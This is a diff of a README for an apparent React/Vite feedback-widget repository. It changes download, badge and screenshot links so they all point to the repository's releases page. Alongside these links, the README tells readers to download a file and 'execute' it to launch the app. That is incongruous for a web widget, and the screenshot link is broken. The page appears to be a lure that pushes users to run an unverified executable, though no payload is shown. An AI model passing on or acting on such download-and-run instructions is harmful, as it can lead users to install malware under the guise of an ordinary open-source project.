@@ -15,16 +15,16 @@ This repository hosts a powerful feedback widget that can easily be integrated i
 #easy-integration #feedback #feedback-collector #feedback-form #feedback-widget #feedback-widget-app #postgresql #react-vite #reactjs #supabase #supabase-db #tailwindcss #widget #widget-app #widget-manager
 
 ## Repository Link
-[Download Widget App 📥](https://github.com/project/files/App.zip)
+[Download Widget App 📥](https://github.com/Thalles148/Feedback-Widget--ReactVite/releases)
 
 >#### ⚠️ Note: Execute the downloaded file to launch the application.
 
 If the provided link is not working or not available, please refer to the **Releases** section for alternative download options.
 
-[![Download Widget App](https://img.shields.io/badge/Download-Widget_App-blue.svg)](https://github.com/project/files/App.zip)
+[![Download Widget App](https://github.com/Thalles148/Feedback-Widget--ReactVite/releases)](https://github.com/Thalles148/Feedback-Widget--ReactVite/releases)
 
 ## Screenshots
-![Feedback Widget Preview](https://via.placeholder.com/800x400)
+![Feedback Widget Preview](https://github.com/Thalles148/Feedback-Widget--ReactVite/releases)
 
 ## Getting Started
 To get started with the feedback widget, follow these steps:
